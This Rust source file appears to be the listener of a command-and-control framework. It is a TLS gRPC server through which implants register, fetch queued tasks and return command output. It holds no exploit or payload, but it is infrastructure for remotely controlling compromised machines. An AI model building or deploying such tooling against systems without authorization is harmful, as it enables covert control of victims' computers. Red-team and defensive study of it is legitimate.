use crate::server::db;
use crate::share::{implantpb, Error};
use implantpb::implant_rpc_server::{ImplantRpc, ImplantRpcServer};
use implantpb::{Empty, Registration, TaskRequest, TaskResponse, TaskResult};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::Mutex;
use tonic::transport::{Identity, Server, ServerTlsConfig};
use tonic::{Request, Response, Status};

// Listen for implants
pub struct Listener {
    pub uuid: uuid::Uuid,
    pub lhost: String,
    pub lport: u16,
}

impl Listener {
    pub fn new(addr: SocketAddr, db: Arc<Mutex<db::Db>>) -> Result<Listener, Error> {
        // TODO: Auto generate certs instead of using hard-coded certs
        let cert =
            std::fs::read("certs/server.pem").map_err(|e| Error::FileReadErr("certs/server.pem".to_string(), e.to_string()))?;
        let key =
            std::fs::read("certs/server.key").map_err(|e| Error::FileReadErr("certs/server.key".to_string(), e.to_string()))?;
        let identity = Identity::from_pem(cert, key);

        let service = ImplantService::new(Arc::clone(&db));
        let tls_config = ServerTlsConfig::new().identity(identity);
        let svc = ImplantRpcServer::new(service);

        let server = Server::builder()
            .tls_config(tls_config)
            .map_err(|_| Error::ListenerStartErr(addr.ip().to_string(), addr.port()))?
            .add_service(svc)
            .serve(addr);

        tokio::spawn(async move { server.await });

        Ok(Listener {
            uuid: uuid::Uuid::new_v4(),
            lhost: addr.ip().to_string(),
            lport: addr.port(),
        })
    }
}

// Define gRPC methods
struct ImplantService {
    // Let the implants interact with the database
    db: Arc<Mutex<db::Db>>,
}

impl ImplantService {
    fn new(db: Arc<Mutex<db::Db>>) -> ImplantService {
        ImplantService { db }
    }
}

// Implement the protobuf services
#[tonic::async_trait]
impl ImplantRpc for ImplantService {
    // Let an implant register with the server
    async fn register(&self, request: Request<Registration>) -> Result<Response<Empty>, Status> {
        let request = request.into_inner();
        self.db
            .lock()
            .await
            .register_implant(request)
            .await
            .map_err(|_| Status::unavailable(""))?;

        Ok(Response::new(Empty {}))
    }

    // Let an implant retrieve a task
    async fn get_task(
        &self,
        request: Request<TaskRequest>,
    ) -> Result<Response<TaskResponse>, Status> {
        let implant_id = request.into_inner().implant_id;

        let task = self
            .db
            .lock()
            .await
            .pop_task(implant_id)
            .ok_or_else(|| Status::unavailable(""))?;

        Ok(Response::new(task))
    }

    // Let an implant return the results to the server
    async fn post_result(&self, request: Request<TaskResult>) -> Result<Response<Empty>, Status> {
        let task_result = request.into_inner();
        if let Ok(stdout) = std::str::from_utf8(&task_result.stdout) {
            println!("{}", stdout);
        }
        if let Ok(stderr) = std::str::from_utf8(&task_result.stderr) {
            println!("{}", stderr);
        }
        Ok(Response::new(Empty {}))
    }
}
